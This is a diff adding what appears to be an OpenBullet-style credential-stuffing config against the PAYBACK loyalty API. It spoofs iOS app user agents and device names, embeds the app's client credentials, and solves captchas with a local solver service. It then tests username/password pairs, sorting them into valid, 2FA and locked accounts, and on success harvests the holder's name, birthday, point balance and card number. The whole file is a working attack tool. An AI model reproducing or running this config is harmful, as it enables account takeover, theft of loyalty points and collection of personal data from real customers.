@@ -1,0 +1,248 @@
+BLOCK:GetRandomItem
+DISABLED
+LABEL:RANDOM_VERSION
+  list = ["DSA/24.09.1201(1726501120)", "DSA/4.08.2900(1724923395)", "DSA/24.09.2601(1727857299)", "DSA/24.11.0700(1730974985)", "DSA/24.11.2100(1732777280)", "DSA/24.12.0501(1734625449)"]
+  => VAR @RANDOM_VERSION
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:authorization
+  value = "aW9zYXBwX2RlXzI0YTpxYWVBSmtwZ0Q3bWFLRFdF"
+  => VAR @authorization
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:credential
+  value = "qaeAJkpgD7maKDWE"
+  => VAR @credential
+ENDBLOCK
+
+BLOCK:GetRandomItem
+LABEL:iphone
+  list = ["iPhone von Max", "iPhone von Lara", "iPhone von Jonas", "iPhone von Sarah", "iPhone von Tim", "iPhone von Anna", "iPhone von Paul", "iPhone von Julia", "iPhone von Daniel", "iPhone von Emma", "iPhone von Leon", "iPhone von Lisa", "iPhone von Felix", "iPhone von Mia", "iPhone von Tom", "iPhone von Sophie", "iPhone von David", "iPhone von Clara", "iPhone von Marc", "iPhone von Eva", "iPhone von Noah", "iPhone von Laura", "iPhone von Lukas", "iPhone von Jana", "iPhone von Alexander", "iPhone von Maria", "iPhone von Oliver", "iPhone von Michael", "iPhone von Charlotte", "iPhone von Samuel", "iPhone von Simon", "iPhone von Emilia", "iPhone von Jan", "iPhone von Nina", "iPhone von Melanie", "iPhone von Ben", "iPhone von Pia", "iPhone von Patrick", "iPhone von Sandra", "iPhone von Erik", "iPhone von Leonie", "iPhone von Fabian", "iPhone von Katharina", "iPhone von Tobias", "iPhone von Nils", "iPhone von Esther", "iPhone von Markus", "iPhone von Karla", "iPhone von Julian", "iPhone von Theresa", "iPhone von Gabriel", "iPhone von Moritz", "iPhone von Stefanie", "iPhone von Benjamin", "iPhone von Marie", "iPhone von André", "iPhone von Oliver", "iPhone von Theo", "iPhone von Florian", "iPhone von Lea", "iPhone von Katrin", "iPhone von Nicolas", "iPhone von Maren", "iPhone von Jannik", "iPhone von Emil", "iPhone von Alina", "iPhone von Jakob", "iPhone von Henry", "iPhone von Vanessa", "iPhone von Thomas", "iPhone von Greta", "iPhone von Luisa", "iPhone von Max", "iPhone von Miriam", "iPhone von Jonas", "iPhone von Dennis", "iPhone von Elisa", "iPhone von Laura", "iPhone von Katharina", "iPhone von Stefanie", "iPhone von Julia", "iPhone von Carolin", "iPhone von Michelle", "iPhone von Anton", "iPhone von Anton", "iPhone von Lea", "iPhone von Benjamin", "iPhone von Leonie", "iPhone von Marlene", "iPhone von Simon", "iPhone von Gabriel", "iPhone von Oliver", "iPhone von Theo", "iPhone von Elisa", "iPhone von Marie", "iPhone von Jan", "iPhone von Paula", "iPhone von Nils", "iPhone von Clara", "iPhone von Jannik", "iPhone von Luca", "iPhone von Michael", "iPhone von Noah", "iPhone von Peter", "iPhone von Isabel", "iPhone von Daniel", "iPhone von Patrick", "iPhone von Elias", "iPhone von Philipp", "iPhone von Emily", "iPhone von Janine", "iPhone von Charlotte", "iPhone von Andreas", "iPhone von Eva", "iPhone von Johanna", "iPhone von Richard", "iPhone von Pia", "iPhone von Lukas", "iPhone von Vanessa", "iPhone von Tom", "iPhone von Katharina", "iPhone von Robert", "iPhone von Thomas", "iPhone von Jakob", "iPhone von Luca", "iPhone von Adrian", "iPhone von Clara", "iPhone von Emil", "iPhone von Michelle", "iPhone von Nina", "iPhone von Benita", "iPhone von David", "iPhone von Olivia", "iPhone von Sophie", "iPhone von Greta", "iPhone von Simon", "iPhone von Jens", "iPhone von Caroline", "iPhone von Robert", "iPhone von Clara", "iPhone von Jan", "iPhone von Mathias", "iPhone von Elsa", "iPhone von Sophia", "iPhone von Felix", "iPhone von Alexander", "iPhone von Rachel", "iPhone von Thomas", "iPhone von Julian", "iPhone von Lea", "iPhone von Finn", "iPhone von Benjamin", "iPhone von Daniel", "iPhone von Markus", "iPhone von Michelle", "iPhone von Paulina", "iPhone von Miriam", "iPhone von Marie", "iPhone von Carmen", "iPhone von Clara", "iPhone von Henrik", "iPhone von Tim", "iPhone von Sarah", "iPhone von Julian", "iPhone von Emma", "iPhone von Maria", "iPhone von Alina", "iPhone von Leonie", "iPhone von Niklas", "iPhone von Theo", "iPhone von Leni", "iPhone von Frieda", "iPhone von Charlotte", "iPhone von Jakob", "iPhone von Till", "iPhone von Katharina", "iPhone von Lea", "iPhone von Patricia", "iPhone von Isabel", "iPhone von Janina", "iPhone von Karl", "iPhone von Alex", "iPhone von Lisa", "iPhone von David", "iPhone von Richard", "iPhone von Laura", "iPhone von Jan", "iPhone von Isabel", "iPhone von Anna", "iPhone von Tim", "iPhone von Laura", "iPhone von Felix", "iPhone von Carolin", "iPhone von Theo", "iPhone von Isabella", "iPhone von Philipp", "iPhone von Sandra", "iPhone von Noemi", "iPhone von Tom", "iPhone von Tobias", "iPhone von Leonie", "iPhone von Lukas", "iPhone von Sarah", "iPhone von Viktor", "iPhone von Alina", "iPhone von Carla", "iPhone von Jan", "iPhone von Maja", "iPhone von Mona", "iPhone von Clara", "iPhone von Mark", "iPhone von Emil", "iPhone von David", "iPhone von Michael", "iPhone von Jonas", "iPhone von Sophie", "iPhone von Sarah", "iPhone von Klaus", "iPhone von Juliane", "iPhone von Heike", "iPhone von Tim", ""]
+  => VAR @RANDOM_IPHONE_NAME
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:ver
+  value = "DSA/25.11.2700(1764342159)"
+  => VAR @RANDOM_VERSION
+ENDBLOCK
+
+BLOCK:GetRandomItem
+LABEL:ios ver
+  list = ["iOS/14.0", "iOS/14.0.1", "iOS/14.1", "iOS/14.2", "iOS/14.2.1", "iOS/14.3", "iOS/14.4", "iOS/14.4.1", "iOS/14.4.2", "iOS/14.5", "iOS/14.5.1", "iOS/14.6", "iOS/14.7", "iOS/14.7.1", "iOS/14.8", "iOS/14.8.1"]
+  => VAR @RANDOM_IOS_VERSION
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:random us
+  value = $"<RANDOM_VERSION> <RANDOM_IOS_VERSION>"
+  => VAR @RANDOM_USERAGENT
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/createcaptcha"
+  method = POST
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "<RANDOM_USERAGENT>"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"consumerIdentification\":{\"consumerAuthentication\":{\"credential\":\"<credential>\",\"principal\":\"138\"}}}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.SOURCE Contains "Forbidden"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "captchaID"
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "captchaID\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @id
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = $"https://www.payback.de/pb/res/mam/4/<id>/34/1/1"
+  customHeaders = {("User-Agent", "<RANDOM_USERAGENT>"), ("Pragma", "no-cache"), ("Accept", "*/*"), ("Accept-Language", "en-US,en;q=0.8")}
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:ByteArrayToBase64String
+  bytes = @data.RAWSOURCE
+  => VAR @png
+ENDBLOCK
+SET USEPROXY FALSE
+
+BLOCK:HttpRequest
+  url = "http://localhost:5000/kaka"
+  method = POST
+  TYPE:RAW
+  @png
+  "application/octet-stream"
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\"prediction\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @so
+ENDBLOCK
+SET USEPROXY TRUE
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/secureauthenticate"
+  method = POST
+  securityProtocol = TLS12
+  useCustomCipherSuites = True
+  customCipherSuites = ["TLS_AES_256_GCM_SHA384"]
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "DSA/27.10.2700(1764342159) iOS/17.6.1"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"consumerIdentification\":{\"consumerAuthentication\":{\"credential\":\"<credential>\",\"principal\":\"138\"}},\"authentication\":{\"identification\":{\"alias\":\"<input.USER>\",\"aliasType\":5},\"security\":{\"secret\":\"<input.PASS>\",\"secretType\":3}},\"captchaAnswer\":{\"captchaID\":\"<id>\",\"captchaAnswer\":\"<so>\"},\"clientDisplayName\":\"<RANDOM_IPHONE_NAME>\",\"authorizationRequestValidityDuration\":120,\"managedMemberDeviceIdentifiers\":[]}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:keycheck
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "standardAuthentication"
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "Invalid alias or secret."
+    STRINGKEY @data.SOURCE Contains "Validation failed. ["
+    STRINGKEY @data.SOURCE Contains "malformed request syntax"
+  KEYCHAIN 2FA OR
+    STRINGKEY @data.SOURCE Contains "multifactorAuthentication"
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.SOURCE Contains "Retry command with Captcha"
+  KEYCHAIN LOCKED OR
+    STRINGKEY @data.SOURCE Contains "Account has been disabled."
+    STRINGKEY @data.SOURCE Contains "account is permanently locked!"
+    STRINGKEY @data.SOURCE Contains " account is temporarily locked"
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.SOURCE Contains "Forbidden"
+    STRINGKEY @data.SOURCE Contains "Request unsuccessful. Incapsula incident"
+    STRINGKEY @data.SOURCE Contains "Too Many Requests"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:tk
+  input = @data.SOURCE
+  jToken = "standardAuthentication.token"
+  MODE:Json
+  => VAR @TOKEN
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/updateentitlementconsents"
+  method = POST
+  useCustomCipherSuites = True
+  customCipherSuites = ["TLS_AES_256_GCM_SHA384"]
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "<RANDOM_USERAGENT>"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"entitlementConsentListItem\":[{\"entitlementConsentStatus\":1,\"entitlementShortName\":\"APP_USAGE\"}],\"authentication\":{\"token\":\"<TOKEN>\"},\"consumerIdentification\":{\"consumerAuthentication\":{\"credential\":\"<credential>\",\"principal\":\"138\"}}}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/getmember"
+  method = POST
+  useCustomCipherSuites = True
+  customCipherSuites = ["TLS_AES_256_GCM_SHA384"]
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "<RANDOM_USERAGENT>"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"consumerIdentification\":{\"consumerAuthentication\":{\"principal\":\"138\",\"credential\":\"<credential>\"}},\"authentication\":{\"token\":\"<TOKEN>\"}}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:first name
+  input = @data.SOURCE
+  jToken = "masterInfo.firstName"
+  MODE:Json
+  => VAR @f
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:last name
+  input = @data.SOURCE
+  jToken = "masterInfo.lastName"
+  MODE:Json
+  => VAR @l
+ENDBLOCK
+
+BLOCK:ConstantString
+  value = $"<f> <l>"
+  => CAP @Name
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "dateOfBirth\":\""
+  rightDelim = "\""
+  MODE:LR
+  => CAP @Birthday
+ENDBLOCK
+
+BLOCK:ClearCookies
+LABEL:Clear
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/getaccountbalance"
+  method = POST
+  autoRedirect = False
+  useCustomCipherSuites = True
+  customCipherSuites = ["TLS_AES_256_GCM_SHA384"]
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "<RANDOM_USERAGENT>"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"consumerIdentification\":{\"consumerAuthentication\":{\"principal\":\"138\",\"credential\":\"<credential>\"}},\"authentication\":{\"token\":\"<TOKEN>\"}}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:available points
+  input = @data.SOURCE
+  jToken = "accountBalanceDetails[0].availablePointsAmount"
+  MODE:Json
+  => CAP @Punkte
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Locked Pionts
+  input = @data.SOURCE
+  jToken = "accountBalanceDetails[0].blockedPointsAmount"
+  MODE:Json
+  => CAP @Locked
+ENDBLOCK
+
+BLOCK:HttpRequest
+  url = "https://services-ext.payback.de/138/v1/json/getaliasbarcodecode"
+  method = POST
+  useCustomCipherSuites = True
+  customCipherSuites = ["TLS_AES_256_GCM_SHA384"]
+  customHeaders = ${("Host", "services-ext.payback.de"), ("Content-Type", "application/json; charset=utf8"), ("Accept-Language", "de-DE,de;q=0.9"), ("Connection", "keep-alive"), ("Accept", "application/json; charset=utf-8"), ("User-Agent", "<RANDOM_USERAGENT>"), ("Authorization", "Basic <authorization>"), ("Accept-Encoding", "gzip")}
+  TYPE:STANDARD
+  $"{\"consumerIdentification\":{\"consumerAuthentication\":{\"credential\":\"qaeAJkpgD7maKDWE\",\"principal\":\"138\"}},\"authentication\":{\"token\":\"<TOKEN>\"},\"aliasBarcodeCodeType\":2}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Ali
+  input = @data.SOURCE
+  jToken = "encodedAlias.alias"
+  MODE:Json
+  => VAR @ALIAS
+ENDBLOCK
+
+BLOCK:Substring
+LABEL:SHIA
+  input = @ALIAS
+  index = 6
+  length = 10
+  => CAP @card
+ENDBLOCK
